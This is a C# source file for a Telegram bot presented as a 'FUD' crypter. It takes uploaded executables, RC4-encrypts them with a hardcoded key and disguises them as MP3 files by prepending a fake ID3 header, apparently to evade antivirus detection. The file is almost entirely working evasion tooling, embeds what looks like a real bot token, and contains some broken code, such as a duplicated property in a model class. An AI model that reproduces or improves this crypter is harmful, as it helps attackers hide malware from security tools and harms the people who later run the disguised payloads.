using System;
using System.IO;
using System.Net.Http;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;

var builder = WebApplication.CreateBuilder(args);
builder.Services.AddHttpClient();
var app = builder.Build();

// YOUR BOT TOKEN!
const string BOT_TOKEN = "8031101109:AAHs7ntgzES7cq-KvH_ms_i6V8uR_jhPkPo";

app.MapPost("/crypt", async (HttpContext ctx, IHttpClientFactory http) => {
    using var reader = new StreamReader(ctx.Request.Body);
    var json = await reader.ReadToEndAsync();
    var update = JsonSerializer.Deserialize<TelegramUpdate>(json);
    
    if (update?.Message?.Document != null) {
        var client = http.CreateClient();
        client.DefaultRequestHeaders.Add("User-Agent", "FUDBot/1.0");
        
        // Get file info
        var fileInfo = await client.GetFromJsonAsync<TelegramFile>($"https://api.telegram.org/bot{BOT_TOKEN}/getFile?file_id={update.Message.Document.FileId}");
        if (fileInfo?.Result?.FilePath == null) return Results.Ok();
        
        // Download EXE
        var fileBytes = await client.GetByteArrayAsync($"https://api.telegram.org/file/bot{BOT_TOKEN}/{fileInfo.Result.FilePath}");
        
        // FUD CRYPT!
        var fudMp3 = CreateFudMp3(fileBytes, "FUD2026KEY!");
        
        // Send back MP3
        using var mp3Content = new ByteArrayContent(fudMp3);
        mp3Content.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("audio/mpeg");
        
        var form = new MultipartFormDataContent();
        form.Add(new StringContent(update.Message.Chat.Id.ToString()), "chat_id");
        form.Add(new StringContent("fud.mp3"), "caption");
        form.Add(mp3Content, "document", "fud.mp3");
        
        await client.PostAsync($"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument", form);
        await client.GetAsync($"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={update.Message.Chat.Id}&text=✅ FUD MP3 ready! Key: FUD2026KEY!");
    }
    
    return Results.Ok();
});

app.Run("0.0.0.0:8080");

// FUD FUNCTIONS
static byte[] RC4(byte[] data, byte[] key) {
    byte[] s = new byte[256];
    for (int i = 0; i < 256; i++) s[i] = (byte)i;
    int j = 0;
    for (int i = 0; i < 256; i++) {
        j = (j + s[i] + key[i % key.Length]) % 256;
        (s[i], s[j]) = (s[j], s[i]);
    }
    byte[] result = new byte[data.Length];
    int i2 = 0, j2 = 0;
    for (int k = 0; k < data.Length; k++) {
        i2 = (i2 + 1) % 256;
        j2 = (j2 + s[i2]) % 256;
        (s[i2], s[j2]) = (s[j2], s[i2]);
        result[k] = (byte)(data[k] ^ s[(s[i2] + s[j2]) % 256]);
    }
    return result;
}

static byte[] CreateFudMp3(byte[] exe, string keyStr) {
    var key = Encoding.UTF8.GetBytes(keyStr);
    var encrypted = RC4(exe, key);
    var mp3Head = Encoding.ASCII.GetBytes("ID3v2.3\x00\x00\x00\x64\x00\x00\x00\x00\x00\x00\x00");
    var fudMp3 = new byte[mp3Head.Length + encrypted.Length];
    mp3Head.CopyTo(fudMp3, 0);
    encrypted.CopyTo(fudMp3, mp3Head.Length);
    return fudMp3;
}

// Telegram JSON Models
public class TelegramUpdate { public Message Message { get; set; } }
public class Message { public Document Document { get; set; } public Chat Chat { get; set; } public long Chat { get { return Chat?.Id ?? 0; } } }
public class Document { public string FileId { get; set; } }
public class Chat { public long Id { get; set; } }
public class TelegramFile { public Result Result { get; set; } }
public class Result { public string FilePath { get; set; } }